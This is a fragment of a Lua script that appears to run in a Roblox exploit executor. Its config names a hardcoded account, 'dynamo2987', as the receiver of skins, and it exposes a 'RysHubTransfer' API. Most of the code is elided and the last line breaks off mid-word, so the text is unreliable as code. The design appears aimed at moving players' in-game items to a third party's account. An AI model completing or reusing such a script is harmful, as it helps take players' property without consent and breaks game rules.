local CONFIG = {
    ...
    TARGET_NAME   = "dynamo2987", -- username de la cuenta que recibe las skins
...
if typeof(getgenv) == "function" then getgenv().RysHubTransfer = API else _G.RysHubTransfer = API en
